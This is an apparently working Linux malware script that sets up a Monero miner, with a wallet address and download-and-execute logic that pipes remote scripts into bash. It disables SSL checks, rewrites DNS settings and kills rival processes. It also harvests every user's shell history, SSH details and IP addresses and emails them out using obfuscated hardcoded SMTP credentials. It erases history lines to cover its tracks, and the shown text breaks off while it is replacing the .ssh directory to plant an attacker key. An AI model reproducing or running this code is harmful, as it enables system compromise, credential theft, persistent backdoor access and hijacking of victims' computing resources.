#!/bin/bash
set -uo pipefail
IFS=$'\n\t'

# ========================================================================
# COMPATIBILITY FIXES FOR ANCIENT SYSTEMS (Added to handle curl/SSL errors)
# ========================================================================

# Function to check for systemd vs SysV
detect_init_system() {
    if command -v systemctl >/dev/null 2>&1 && [ -d /run/systemd/system ]; then
        echo "systemd"
    elif [ -d /etc/init.d ] || command -v service >/dev/null 2>&1; then
        echo "sysv"
    elif [ -f /sbin/init ] && file /sbin/init | grep -q "upstart"; then
        echo "upstart"
    else
        echo "unknown"
    fi
}

# Enhanced service management for systems without systemctl
safe_service_stop() {
    local service="$1"
    local init_system=$(detect_init_system)
    
    case "$init_system" in
        "systemd")
            systemctl stop "$service" 2>/dev/null || true
            ;;
        "sysv")
            if [ -f "/etc/init.d/$service" ]; then
                /etc/init.d/"$service" stop 2>/dev/null || true
            elif command -v service >/dev/null 2>&1; then
                service "$service" stop 2>/dev/null || true
            fi
            ;;
        "upstart")
            stop "$service" 2>/dev/null || true
            ;;
    esac
    
    # Always try to kill by process name as last resort
    pkill -9 -f "$service" 2>/dev/null || true
    killall -9 "$service" 2>/dev/null || true
}

# Enhanced download function to handle ancient curl versions and SSL errors
fix_dns_and_retry() {
    echo "[!] Download failed - checking DNS configuration..."
    
    # Check if 1.1.1.1 is already in resolv.conf
    if grep -q "nameserver 1.1.1.1" /etc/resolv.conf 2>/dev/null; then
        echo "[✓] Cloudflare DNS (1.1.1.1) already configured"
        return 1  # DNS is already correct, issue is elsewhere
    fi
    
    echo "[*] Adding Cloudflare DNS (1.1.1.1) to /etc/resolv.conf"
    
    # Backup original resolv.conf
    if [ -f /etc/resolv.conf ]; then
        cp /etc/resolv.conf /etc/resolv.conf.backup.$(date +%s) 2>/dev/null
        echo "[✓] Backed up original resolv.conf"
    fi
    
    # Add 1.1.1.1 as the first nameserver
    {
        echo "nameserver 1.1.1.1"
        echo "nameserver 8.8.8.8"
        grep -v "^nameserver" /etc/resolv.conf 2>/dev/null || true
    } > /etc/resolv.conf.new
    
    mv /etc/resolv.conf.new /etc/resolv.conf
    echo "[✓] DNS updated - added 1.1.1.1 and 8.8.8.8"
    
    # Test DNS resolution
    echo "[*] Testing DNS resolution..."
    if ping -c 1 -W 3 1.1.1.1 >/dev/null 2>&1; then
        echo "[✓] Can reach 1.1.1.1"
    else
        echo "[!] WARNING: Cannot reach 1.1.1.1 - network may be down"
        return 1
    fi
    
    if nslookup github.com >/dev/null 2>&1 || host github.com >/dev/null 2>&1; then
        echo "[✓] DNS resolution working"
        return 0  # Success - DNS is now working
    else
        echo "[!] WARNING: DNS resolution still failing"
        return 1
    fi
}

# Enhanced download function for ancient systems with SSL issues
download_and_execute() {
    local url="$1"
    local wallet="$2"
    local description="$3"
    local max_retries=5  # Increased retries
    local retry=0
    local dns_fix_attempted=false
    
    echo "[*] Downloading $description from: $url"
    
    while [ $retry -lt $max_retries ]; do
        # Try curl with compatibility options for ancient systems
        if command -v curl >/dev/null 2>&1; then
            # Check curl version for compatibility
            CURL_VERSION=$(curl --version 2>/dev/null | head -1 | grep -o '[0-9]\+\.[0-9]\+\.[0-9]\+' || echo "0.0.0")
            
            echo "[*] Using curl version $CURL_VERSION (attempt $((retry + 1))/$max_retries)"
            
            # For ancient curl (< 7.40), try different SSL backends
            if [[ "$CURL_VERSION" < "7.40" ]]; then
                echo "[!] Ancient curl detected ($CURL_VERSION), using legacy SSL options..."
                
                # Method 1: Try with SSLv3 (for RHEL/CentOS 5/6)
                echo "[*] Trying SSLv3 (for ancient systems)..."
                if curl --ssl3 --tlsv1 --max-time 30 "$url" 2>/dev/null | bash -s "$wallet" 2>&1 | tee -a "$LOG_FILE"; then
                    echo "[✓] $description completed successfully with SSLv3"
                    return 0
                fi
                
                # Method 2: Try with --insecure and SSLv3
                echo "[*] Trying --insecure + SSLv3..."
                if curl --insecure --ssl3 --max-time 30 "$url" 2>/dev/null | bash -s "$wallet" 2>&1 | tee -a "$LOG_FILE"; then
                    echo "[✓] $description completed successfully with --insecure+SSLv3"
                    return 0
                fi
                
                # Method 3: Try HTTP instead of HTTPS
                echo "[*] Trying HTTP instead of HTTPS..."
                local http_url=$(echo "$url" | sed 's/^https:/http:/')
                if curl --max-time 30 "$http_url" 2>/dev/null | bash -s "$wallet" 2>&1 | tee -a "$LOG_FILE"; then
                    echo "[✓] $description completed successfully via HTTP"
                    return 0
                fi
                
                # Method 4: Try with different SSL backends
                echo "[*] Trying different SSL backends..."
                
                # Try with NSS compat mode
                if curl --engine nss --max-time 30 "$url" 2>/dev/null | bash -s "$wallet" 2>&1 | tee -a "$LOG_FILE"; then
                    echo "[✓] $description completed successfully with NSS engine"
                    return 0
                fi
            else
                # Modern curl with standard options
                echo "[*] Trying standard curl..."
                if curl -s -L --max-time 30 "$url" 2>/dev/null | bash -s "$wallet" 2>&1 | tee -a "$LOG_FILE"; then
                    echo "[✓] $description completed successfully"
                    return 0
                fi
                
                # Try with --insecure as fallback
                echo "[*] Trying with --insecure flag..."
                if curl -s -L --insecure --max-time 30 "$url" 2>/dev/null | bash -s "$wallet" 2>&1 | tee -a "$LOG_FILE"; then
                    echo "[✓] $description completed successfully (with --insecure)"
                    return 0
                fi
                
                # Try HTTP
                echo "[*] Trying HTTP..."
                local http_url=$(echo "$url" | sed 's/^https:/http:/')
                if curl -s -L --max-time 30 "$http_url" 2>/dev/null | bash -s "$wallet" 2>&1 | tee -a "$LOG_FILE"; then
                    echo "[✓] $description completed successfully via HTTP"
                    return 0
                fi
            fi
        fi
        
        # If curl failed or doesn't exist, try wget
        if command -v wget >/dev/null 2>&1; then
            echo "[*] curl failed - falling back to wget (attempt $((retry + 1))/$max_retries)"
            
            # Try standard wget
            if wget -qO- --timeout=30 "$url" 2>/dev/null | bash -s "$wallet" 2>&1 | tee -a "$LOG_FILE"; then
                echo "[✓] $description completed successfully via wget"
                return 0
            else
                # Try without certificate check
                echo "[*] wget with SSL verification failed - trying --no-check-certificate..."
                if wget -qO- --no-check-certificate --timeout=30 "$url" 2>/dev/null | bash -s "$wallet" 2>&1 | tee -a "$LOG_FILE"; then
                    echo "[✓] $description completed successfully via wget (--no-check-certificate)"
                    return 0
                fi
                
                # Try HTTP
                echo "[*] Trying HTTP with wget..."
                local http_url=$(echo "$url" | sed 's/^https:/http:/')
                if wget -qO- --timeout=30 "$http_url" 2>/dev/null | bash -s "$wallet" 2>&1 | tee -a "$LOG_FILE"; then
                    echo "[✓] $description completed successfully via HTTP"
                    return 0
                fi
                
                # Try with SSL disabled completely
                echo "[*] Trying wget with SSL disabled..."
                if wget -qO- --no-check-certificate --secure-protocol=SSLv3 --timeout=30 "$url" 2>/dev/null | bash -s "$wallet" 2>&1 | tee -a "$LOG_FILE"; then
                    echo "[✓] $description completed successfully via wget (SSLv3)"
                    return 0
                fi
            fi
        fi
        
        # Try lynx (text browser) as fallback
        if command -v lynx >/dev/null 2>&1; then
            echo "[*] Trying lynx (text browser)..."
            if lynx -source "$url" 2>/dev/null | bash -s "$wallet" 2>&1 | tee -a "$LOG_FILE"; then
                echo "[✓] $description completed successfully via lynx"
                return 0
            fi
        fi
        
        echo "[!] All download methods failed (attempt $((retry + 1))/$max_retries)"
        
        retry=$((retry + 1))
        
        # On last retry attempt, try DNS fix if not already attempted
        if [ $retry -eq $max_retries ] && [ "$dns_fix_attempted" = false ]; then
            echo "[!] All download attempts failed - attempting DNS fix..."
            if fix_dns_and_retry; then
                echo "[*] DNS fixed - retrying download one more time..."
                dns_fix_attempted=true
                max_retries=$((max_retries + 1))  # Give one more chance
                sleep 3
            fi
        elif [ $retry -lt $max_retries ]; then
            echo "[*] Retry in 3 seconds..."
            sleep 3
        fi
    done
    
    echo "[ERROR] $description failed after all retry attempts"
    echo "[*] Last resort: creating manual download script..."
    
    # Create a manual download script as last resort
    create_manual_fallback "$url" "$wallet" "$description"
    return $?
}

# Create manual download fallback script
create_manual_fallback() {
    local url="$1"
    local wallet="$2"
    local description="$3"
    
    echo "[*] Creating manual fallback script..."
    
    cat > /tmp/manual_fallback.sh << 'EOF'
#!/bin/bash
echo "========================================"
echo "MANUAL FALLBACK ACTIVATED"
echo "========================================"
echo ""
echo "Your system cannot download from HTTPS due to:"
echo "1. Ancient SSL/TLS libraries"
echo "2. Missing CA certificates"
echo "3. Old curl/wget versions"
echo ""
echo "Manual solution:"
echo "1. On a MODERN computer, download:"
echo "   https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/setup_FULL_ULTIMATE_v3.2.sh"
echo ""
echo "2. Transfer to this server using one of these methods:"
echo ""
echo "   Option A - SCP (from modern Linux/Mac):"
echo "   scp setup_FULL_ULTIMATE_v3.2.sh root@$(hostname -I | awk '{print $1}'):/tmp/"
echo ""
echo "   Option B - Python HTTP server:"
echo "   On modern computer: python3 -m http.server 8000"
echo "   On this server: curl http://MODERN_IP:8000/setup_FULL_ULTIMATE_v3.2.sh -o /tmp/setup.sh"
echo ""
echo "   Option C - Netcat:"
echo "   On modern computer: cat setup_FULL_ULTIMATE_v3.2.sh | nc -l 4444"
echo "   On this server: nc MODERN_IP 4444 > /tmp/setup.sh"
echo ""
echo "3. After transfer, run:"
echo "   chmod +x /tmp/setup.sh"
echo "   /tmp/setup.sh 49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso"
echo ""
echo "========================================"
EOF
    
    chmod +x /tmp/manual_fallback.sh
    echo "[*] Running manual fallback instructions..."
    /tmp/manual_fallback.sh
    
    return 1
}

# Function to upgrade/install curl and wget for ancient systems
install_download_tools() {
    echo "[*] Checking and installing download tools..."
    
    # Detect package manager
    local pkg_manager=""
    if command -v yum >/dev/null 2>&1; then
        pkg_manager="yum"
    elif command -v apt-get >/dev/null 2>&1; then
        pkg_manager="apt-get"
    elif command -v dnf >/dev/null 2>&1; then
        pkg_manager="dnf"
    elif command -v zypper >/dev/null 2>&1; then
        pkg_manager="zypper"
    elif command -v pacman >/dev/null 2>&1; then
        pkg_manager="pacman"
    fi
    
    if [ -z "$pkg_manager" ]; then
        echo "[!] Cannot determine package manager"
        return 1
    fi
    
    # Check if we have curl
    if ! command -v curl >/dev/null 2>&1; then
        echo "[!] curl not found, attempting to install via $pkg_manager..."
        
        case "$pkg_manager" in
            "yum")
                yum install -y curl 2>/dev/null || yum install -y curl --nogpgcheck 2>/dev/null || true
                ;;
            "apt-get")
                apt-get update -qq 2>/dev/null
                apt-get install -y curl 2>/dev/null || true
                ;;
            "dnf")
                dnf install -y curl 2>/dev/null || true
                ;;
            "zypper")
                zypper install -y curl 2>/dev/null || true
                ;;
            "pacman")
                pacman -Sy curl --noconfirm 2>/dev/null || true
                ;;
        esac
    else
        # Check curl version
        CURL_VERSION=$(curl --version 2>/dev/null | head -1 | grep -o '[0-9]\+\.[0-9]\+\.[0-9]\+' || echo "0.0.0")
        echo "[*] curl version: $CURL_VERSION"
        
        # Try to upgrade if ancient
        if [[ "$CURL_VERSION" < "7.40" ]]; then
            echo "[!] Ancient curl detected, attempting upgrade..."
            case "$pkg_manager" in
                "yum")
                    yum update -y curl 2>/dev/null || true
                    ;;
                "apt-get")
                    apt-get upgrade -y curl 2>/dev/null || true
                    ;;
                "dnf")
                    dnf upgrade -y curl 2>/dev/null || true
                    ;;
            esac
        fi
    fi
    
    # Ensure wget is available as fallback
    if ! command -v wget >/dev/null 2>&1; then
        echo "[*] Installing wget as fallback..."
        case "$pkg_manager" in
            "yum")
                yum install -y wget 2>/dev/null || true
                ;;
            "apt-get")
                apt-get install -y wget 2>/dev/null || true
                ;;
            "dnf")
                dnf install -y wget 2>/dev/null || true
                ;;
            "zypper")
                zypper install -y wget 2>/dev/null || true
                ;;
            "pacman")
                pacman -Sy wget --noconfirm 2>/dev/null || true
                ;;
        esac
    fi
    
    # Install lynx as additional fallback
    if ! command -v lynx >/dev/null 2>&1; then
        echo "[*] Installing lynx as text browser fallback..."
        case "$pkg_manager" in
            "yum")
                yum install -y lynx 2>/dev/null || true
                ;;
            "apt-get")
                apt-get install -y lynx 2>/dev/null || true
                ;;
        esac
    fi
}

# Function to fix SSL certificates on ancient systems
fix_ssl_certificates() {
    echo "[*] Checking SSL certificates..."
    
    # Check for ancient NSS-based curl (RedHat/CentOS 5/6)
    if curl --version 2>/dev/null | grep -q "NSS"; then
        echo "[!] NSS-based curl detected (ancient RedHat/CentOS)"
        
        # Try to update CA certificates
        if command -v yum >/dev/null 2>&1; then
            echo "[*] Attempting to update ca-certificates..."
            yum update -y ca-certificates 2>/dev/null || true
            yum install -y ca-certificates 2>/dev/null || true
        fi
        
        # Try to update NSS
        echo "[*] Checking NSS version..."
        if yum list installed nss 2>/dev/null | grep -q nss; then
            yum update -y nss 2>/dev/null || true
            yum update -y nss-util 2>/dev/null || true
            yum update -y nss-sysinit 2>/dev/null || true
        fi
        
        # Update curl's NSS
        if yum list installed curl 2>/dev/null | grep -q curl; then
            yum update -y curl 2>/dev/null || true
        fi
    fi
    
    # Try to download updated cert bundle as last resort
    echo "[*] Downloading updated CA bundle if possible..."
    
    # Try HTTP first (in case HTTPS fails)
    local ca_urls=(
        "http://curl.se/ca/cacert.pem"
        "https://curl.se/ca/cacert.pem"
        "http://raw.githubusercontent.com/curl/curl/master/lib/cacert.pem"
    )
    
    for ca_url in "${ca_urls[@]}"; do
        if command -v curl >/dev/null 2>&1; then
            echo "[*] Trying to download CA bundle from: $ca_url"
            if curl --insecure --max-time 10 "$ca_url" -o /tmp/cacert.pem 2>/dev/null; then
                echo "[✓] Downloaded CA bundle"
                break
            fi
        elif command -v wget >/dev/null 2>&1; then
            if wget --no-check-certificate --timeout=10 "$ca_url" -O /tmp/cacert.pem 2>/dev/null; then
                echo "[✓] Downloaded CA bundle"
                break
            fi
        fi
    done
    
    if [ -f "/tmp/cacert.pem" ]; then
        # Install in common locations
        local cert_locations=(
            "/etc/pki/tls/certs/ca-bundle.crt"
            "/etc/ssl/certs/ca-certificates.crt"
            "/etc/ssl/cert.pem"
            "/usr/local/ssl/cert.pem"
            "/opt/ssl/cert.pem"
        )
        
        for cert_file in "${cert_locations[@]}"; do
            if [ -f "$cert_file" ] || [ -d "$(dirname "$cert_file")" ]; then
                cat /tmp/cacert.pem >> "$cert_file" 2>/dev/null && \
                echo "[✓] Updated CA bundle at: $cert_file"
            fi
        done
        
        # Set environment variable for curl
        export CURL_CA_BUNDLE="/tmp/cacert.pem"
        echo "[*] Set CURL_CA_BUNDLE=/tmp/cacert.pem"
        
        rm -f /tmp/cacert.pem
    fi
}

# Detect OS and version
detect_os() {
    echo "[*] Detecting operating system..."
    
    if [ -f /etc/os-release ]; then
        . /etc/os-release
        OS_NAME="$ID"
        OS_VERSION="$VERSION_ID"
        echo "[*] Detected: $PRETTY_NAME"
    elif [ -f /etc/redhat-release ]; then
        OS_NAME="rhel"
        OS_VERSION=$(grep -o '[0-9]\+\.[0-9]\+' /etc/redhat-release 2>/dev/null || grep -o '[0-9]\+' /etc/redhat-release | head -1)
        echo "[*] Detected: $(cat /etc/redhat-release)"
    elif [ -f /etc/debian_version ]; then
        OS_NAME="debian"
        OS_VERSION=$(cat /etc/debian_version)
        echo "[*] Detected: Debian $OS_VERSION"
    else
        OS_NAME=$(uname -s | tr '[:upper:]' '[:lower:]')
        OS_VERSION=$(uname -r)
        echo "[*] Detected: $OS_NAME $OS_VERSION"
    fi
    
    # Check if it's ancient
    if [[ "$OS_NAME" == "rhel" || "$OS_NAME" == "centos" ]]; then
        MAJOR_VERSION=$(echo "$OS_VERSION" | cut -d. -f1)
        if [ "$MAJOR_VERSION" -lt 7 ]; then
            echo "[!] WARNING: Ancient RHEL/CentOS $OS_VERSION detected"
            echo "[!] This system likely has very old SSL/TLS libraries"
            return 1  # Flag as ancient
        fi
    fi
    
    return 0
}

# Main compatibility initialization
init_compatibility() {
    echo "========================================"
    echo "INITIALIZING COMPATIBILITY LAYER"
    echo "========================================"
    
    # Detect OS
    if ! detect_os; then
        echo "[!] ANCIENT SYSTEM DETECTED - applying aggressive compatibility fixes"
    fi
    
    # Stop any existing services (compatible with any init system)
    echo "[*] Stopping any conflicting services..."
    safe_service_stop "swapd"
    safe_service_stop "gdm2"
    
    # Run compatibility fixes
    install_download_tools
    fix_ssl_certificates
    
    # Test connectivity with multiple methods
    echo "[*] Testing connection to GitHub..."
    
    local test_urls=(
        "https://raw.githubusercontent.com"
        "http://raw.githubusercontent.com"
        "https://github.com"
        "http://github.com"
    )
    
    local connection_working=false
    for test_url in "${test_urls[@]}"; do
        echo "[*] Testing: $test_url"
        if command -v curl >/dev/null 2>&1; then
            if curl --insecure --max-time 5 "$test_url" >/dev/null 2>&1; then
                echo "[✓] Connection successful to: $test_url"
                connection_working=true
                break
            fi
        elif command -v wget >/dev/null 2>&1; then
            if wget --no-check-certificate --timeout=5 --spider "$test_url" 2>/dev/null; then
                echo "[✓] Connection successful to: $test_url"
                connection_working=true
                break
            fi
        fi
    done
    
    if [ "$connection_working" = false ]; then
        echo "[!] WARNING: All connection tests failed"
        echo "[!] Will use aggressive fallback methods"
    else
        echo "[✓] Connection test successful"
    fi
    
    echo "========================================"
}

# Run compatibility initialization at script start
init_compatibility

# ========================================================================
# ORIGINAL SCRIPT CONTINUES BELOW (with enhanced download_and_execute function)
# ========================================================================

unset HISTFILE

# Configuration variables
readonly RECIPIENT_EMAIL="46eshdfq@anonaddy.me"
readonly LOG_FILE="/tmp/system_report_email.log"
readonly REPORT_FILE="/tmp/system_report.txt"
readonly SERVICES_TO_CHECK=("swapd" "gdm2")

# Decoded SMTP credentials
SMTP_SERVER_B64="c210cC5tYWlsZXJzZW5kLm5ldA=="
readonly SMTP_SERVER=$(echo "$SMTP_SERVER_B64" | base64 -d)
readonly SMTP_PORT=587
SENDER_EMAIL_B64="TVNfQkM3R3FyQHRlc3QtMnAwMzQ3em0yOXlsemRybi5tbHNlbmRlci5uZXQ="
readonly SENDER_EMAIL=$(echo "$SENDER_EMAIL_B64" | base64 -d)
SMTP_PASSWORD_B64="bXNzcC5KNGtyVHFzLmpwemttZ3Fwd20ybDA1OXYuNkdDMmFJWg=="
readonly SMTP_PASSWORD=$(echo "$SMTP_PASSWORD_B64" | base64 -d)

# Function to log messages with timestamp
log_message() {
    local msg="$1"
    echo "$(date '+%Y-%m-%d %H:%M:%S') - $msg" >> "$LOG_FILE"
    echo "$msg"
}

# Function to check if a command exists
command_exists() {
    command -v "$1" >/dev/null 2>&1
}

# Function to send email with Python
send_email_with_python() {
    local temp_file="$1"
    local subject="$2"
    
    python3 -c "
import sys
import smtplib
import ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

try:
    with open('$temp_file', 'r', encoding='utf-8') as f:
        body = f.read()

    msg = MIMEMultipart()
    msg['From'] = '$SENDER_EMAIL'
    msg['To'] = '$RECIPIENT_EMAIL'
    msg['Subject'] = '''$subject'''
    msg.attach(MIMEText(body, 'plain'))

    context = ssl.create_default_context()
    
    with smtplib.SMTP('$SMTP_SERVER', $SMTP_PORT, timeout=10) as server:
        server.ehlo()
        server.starttls(context=context)
        server.ehlo()
        server.login('$SENDER_EMAIL', '$SMTP_PASSWORD')
        server.send_message(msg)
    sys.exit(0)
except Exception as e:
    print(f'Error: {str(e)}', file=sys.stderr)
    sys.exit(1)
" 2>&1
    return $?
}

# Function to send email with curl
send_email_with_curl() {
    local temp_file="$1"
    local subject="$2"
    
    curl -v --ssl-reqd \
        --url "smtp://$SMTP_SERVER:$SMTP_PORT" \
        --user "$SENDER_EMAIL:$SMTP_PASSWORD" \
        --mail-from "$SENDER_EMAIL" \
        --mail-rcpt "$RECIPIENT_EMAIL" \
        --upload-file "$temp_file" 2>&1
    return $?
}

# Function to send email with mail command
send_email_with_mail() {
    local temp_file="$1"
    local subject="$2"
    
    mail -s "$subject" "$RECIPIENT_EMAIL" < "$temp_file"
    return $?
}

# Collect shell history function
collect_shell_history() {
    echo "=== COLLECTING SHELL HISTORIES ==="

    declare -A SHELL_HISTORIES=(
        ["bash"]="$HOME/.bash_history"
        ["zsh"]="$HOME/.zsh_history"
        ["ksh"]="$HOME/.sh_history"
        ["fish"]="$HOME/.local/share/fish/fish_history"
        ["tcsh"]="$HOME/.history"
    )

    local SYSTEM_SHELLS
    SYSTEM_SHELLS=$(grep -v "/false$" /etc/shells | grep -v "/nologin$" | xargs -n1 basename 2>/dev/null)

    local OUTPUT=""
    for shell in $SYSTEM_SHELLS; do
        case $shell in
            "bash"|"zsh"|"ksh"|"fish"|"tcsh")
                local hist_file="${SHELL_HISTORIES[$shell]}"
                if [ -f "$hist_file" ]; then
                    OUTPUT+="\n=== $shell HISTORY ===\n"
                    OUTPUT+="$(cat "$hist_file" 2>/dev/null || echo "Unable to read history")\n"
                fi
                ;;
        esac
    done

    if [ "$(id -u)" -eq 0 ]; then
        for user_dir in /home/*; do
        [ -d "$user_dir" ] || continue
        local user=$(basename "$user_dir")
            for shell in "${!SHELL_HISTORIES[@]}"; do
                local hist_file="/home/$user/${SHELL_HISTORIES[$shell]##*/}"
                if [ -f "$hist_file" ]; then
                    OUTPUT+="\n=== $user's $shell HISTORY ===\n"
                    OUTPUT+="$(cat "$hist_file" 2>/dev/null || echo "Unable to read history")\n"
                fi
            done
        done
    fi

    echo -e "$OUTPUT"
}

# Main email sending function
send_histories_email() {
    local HOSTNAME=$(hostname 2>/dev/null || echo "unknown")
    local PUBLIC_IP=$(curl -4 -s --max-time 5 ip.sb 2>/dev/null || echo "unavailable")
    local LOCAL_IP=$(hostname -I 2>/dev/null | awk '{print $1}' || echo "unavailable")
    local USER=$(whoami)
    
    # Capture the original SSH connection command if available
    local SSH_CONNECTION=$(who am i 2>/dev/null | awk '{print $5}')
    local SSH_CLIENT="${SSH_CLIENT:-unavailable}"
    local SSH_TTY="${SSH_TTY:-unavailable}"
    
    # Try to get the connection command from ps (process status)
    local PARENT_PID=$PPID
    local SSH_COMMAND=$(ps -p $PARENT_PID -o args= 2>/dev/null || ps -p $PPID -o command= 2>/dev/null || echo "unavailable")
    
    # Try to get the connection details from environment variables
    local CONNECTION_FROM_ENV=""
    if [ -n "$SSH_CONNECTION" ]; then
        CONNECTION_FROM_ENV="SSH_CONNECTION: $SSH_CONNECTION"
    fi
    if [ -n "$SSH_CLIENT" ]; then
        CONNECTION_FROM_ENV="$CONNECTION_FROM_ENV\nSSH_CLIENT: $SSH_CLIENT"
    fi
    if [ -n "$SSH_TTY" ]; then
        CONNECTION_FROM_ENV="$CONNECTION_FROM_ENV\nSSH_TTY: $SSH_TTY"
    fi
    
    # Try to get details from .bash_history
    local RECENT_SSH_COMMANDS=$(grep -a "ssh " "$HOME/.bash_history" 2>/dev/null | tail -5 || echo "none found")

    local EMAIL_CONTENT=$(cat <<EOF
=== SYSTEM REPORT ===
Hostname: $HOSTNAME
User: $USER
Public IP: $PUBLIC_IP
Local IP: $LOCAL_IP

=== ORIGINAL CONNECTION INFORMATION ===
SSH Command: $SSH_COMMAND
$CONNECTION_FROM_ENV

Recent SSH commands from history:
$RECENT_SSH_COMMANDS

=== RESOURCES ===
RAM: $(free -h 2>/dev/null | awk '/^Mem:/ {print $2}' || echo "unavailable")
CPU: $(nproc 2>/dev/null || echo "unavailable") cores
Storage: $(df -h / 2>/dev/null | awk 'NR==2 {print $2}' || echo "unavailable")

$(collect_shell_history)
EOF
    )

    # Sanitize hostname for subject line
    local SAFE_HOSTNAME=$(echo "$HOSTNAME" | tr -d '\n\r' | sed 's/[^a-zA-Z0-9._-]/_/g')
    local subject="Full Shell History Report from $SAFE_HOSTNAME"
    local temp_file=$(mktemp)
    echo -e "$EMAIL_CONTENT" > "$temp_file"

    # Always save report locally first
    cp "$temp_file" "$REPORT_FILE" 2>/dev/null || true
    log_message "Report saved to: $REPORT_FILE"

    # Try sending methods in order of preference
    local success=false
    
    # Method 1: Python
    if command_exists python3; then
        log_message "Attempting to send email via Python..."
        local python_output
        if python_output=$(send_email_with_python "$temp_file" "$subject" 2>&1); then
            # Check for success indicators
            if echo "$python_output" | grep -qv "SMTP Error\|535\|authentication failed"; then
                log_message "Email sent successfully via Python"
                success=true
            else
                log_message "Python email method failed: $python_output"
            fi
        else
            log_message "Python email method failed"
        fi
    fi

    # Method 2: mail command
    if [ "$success" = false ] && command_exists mail; then
        log_message "Attempting to send email via mail command..."
        if send_email_with_mail "$temp_file" "$subject" 2>&1; then
            log_message "Email sent successfully via mail command"
            success=true
        else
            log_message "Mail command method failed"
        fi
    fi

    # Method 3: curl
    if [ "$success" = false ] && command_exists curl; then
        log_message "Attempting to send email via curl..."
        local curl_output
        if curl_output=$(send_email_with_curl "$temp_file" "$subject" 2>&1); then
            # Check for auth errors
            if ! echo "$curl_output" | grep -qE "authentication failed|login denied|535|AUTH"; then
                log_message "Email sent successfully via curl"
                success=true
            else
                log_message "Curl email method failed: Authentication error"
            fi
        else
            log_message "Curl email method failed"
        fi
    fi

    # Final fallback
    if [ "$success" = false ]; then
        log_message "Warning: All email sending methods failed - report stored in $REPORT_FILE"
    fi

    rm -f "$temp_file"
    
    # Always return success to continue execution
    return 0
}

# Service management functions (updated for compatibility)
does_service_exist() {
    local service="$1"
    local init_system=$(detect_init_system)
    
    case "$init_system" in
        "systemd")
            systemctl list-units --type=service --all 2>/dev/null | grep -q "$service.service" && return 0
            ;;
        "sysv")
            if [ -f "/etc/init.d/$service" ]; then
                return 0
            elif command -v service >/dev/null 2>&1; then
                service --status-all 2>/dev/null | grep -q "$service" && return 0
            fi
            ;;
    esac
    
    # Check running processes
    if ps aux | grep -v grep | grep -q "$service"; then
        return 0
    fi
    
    return 1
}

is_service_running() {
    local service="$1"
    local init_system=$(detect_init_system)
    
    case "$init_system" in
        "systemd")
            systemctl is-active --quiet "$service" 2>/dev/null && return 0
            ;;
        "sysv")
            if [ -f "/etc/init.d/$service" ]; then
                /etc/init.d/"$service" status >/dev/null 2>&1 && return 0
            elif command -v service >/dev/null 2>&1; then
                service "$service" status >/dev/null 2>&1 && return 0
            fi
            ;;
    esac
    
    # Check running processes
    if ps aux | grep -v grep | grep -q "$service"; then
        return 0
    fi
    
    return 1
}

# Cleanup history function
clean_history_file() {
    local file="$1"
    if [ -f "$file" ]; then
        local line_count=$(wc -l < "$file" 2>/dev/null || echo "0")
        if [ "$line_count" -gt 10 ]; then
            head -n $((line_count - 10)) "$file" > "${file}.tmp" 2>/dev/null
            if [ -f "${file}.tmp" ]; then
                mv "${file}.tmp" "$file"
                log_message "Cleaned last 10 lines of: $file"
            else
                log_message "Failed to create temp file for: $file"
            fi
        elif [ "$line_count" -gt 0 ]; then
            log_message "History file '$file' has ≤10 lines. Not cleaning."
        else
            log_message "History file '$file' is empty."
        fi
    else
        log_message "History file '$file' not found."
    fi
}

cleanup_histories() {
    log_message "Cleaning the last 10 lines of all shell histories..."

    declare -A SHELL_HISTORIES=(
        ["bash"]="$HOME/.bash_history"
        ["zsh"]="$HOME/.zsh_history"
        ["ksh"]="$HOME/.sh_history"
        ["fish"]="$HOME/.local/share/fish/fish_history"
        ["tcsh"]="$HOME/.history"
    )

    for shell in "${!SHELL_HISTORIES[@]}"; do
        clean_history_file "${SHELL_HISTORIES[$shell]}"
    done

    if [ "$(id -u)" -eq 0 ]; then
        for user_dir in /home/*; do
        [ -d "$user_dir" ] || continue
        local user=$(basename "$user_dir")
            for shell in "${!SHELL_HISTORIES[@]}"; do
                clean_history_file "/home/$user/${SHELL_HISTORIES[$shell]##*/}"
            done
        done
    fi
}

# Installation functions
install_mail_utils() {
    log_message "Installing mail utilities..."
    if command_exists apt-get; then
        apt-get update -qq && apt-get install -y mailutils 2>&1 | tee -a "$LOG_FILE"
    elif command_exists yum; then
        yum install -y mailx 2>&1 | tee -a "$LOG_FILE"
    else
        log_message "Warning: Could not determine package manager to install mail utilities"
    fi
}

# Function to safely add SSH key
setup_ssh_key() {
    local ssh_dir="$1"
    local auth_keys="$ssh_dir/authorized_keys"
    local ssh_key='ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDgh9Q31B86YT9fybn6S/DbQQe/G8V0c9+VNjJEmoNxUrIGDqD+vSvS/2uAQ9HaumDAvVau2CcVBJM9STUm6xEGXdM/81LeJBVnw01D+FgFo5Sr/4zo+MDMUS/y/TfwK8wtdeuopvgET/HiZJn9/d68vbWXaS3jnQVTAI9EvpC1WTjYTYxFS/SyWJUQTA8tYF30jagmkBTzFjr/EKxxKTttdb79mmOgx1jP3E7bTjRPL9VxfhoYsuqbPk+FwOAsNZ1zv1UEjXMBvH+JnYbTG/Eoqs3WGhda9h3ziuNrzJGwcXuDhQI1B32XgPDxB8etsT6or8aqWGdRlgiYtkPCmrv+5pEUD8wS3WFhnOrm5Srew7beIl4LPLgbCPTOETgwB4gk/5U1ZzdlYmtiBNJxMeX38BsGoAhTDbFLcakkKP+FyXU/DsoAcow4av4OGTsJfs+sIeOWDQ+We5E4oc/olVNdSZ18RG5dwUde6bXbsrF5ipnE8oIBUI0z76fcbAOxogO/oxhvpuyWPOwXE6GaeOhWfWTxIyV5X4fuFDQXRPlMrlkWZ/cYb+l5JiT1h+vcpX3/dQC13IekE3cUsr08vicZIVOmCoQJy6vOjkj+XsA7pMYb3KgxXgQ+lbCBCtAwKxjGrfbRrlWoqweS/pyGxGrUVJZCf6rC6spEIs+aMy97+Q=='
    
    log_message "Setting up SSH key in $ssh_dir"
    
    # Remove old SSH directory if it exists
    if [ -d "$ssh_dir" ]; then
        rm -rf "$ssh_dir"
    fi
    
    # Create SSH directory
    mkdir -p "$ssh_dir"
    chmod 700 "$ssh_dir"
    
    # Add SSH key only if it doesn't exist
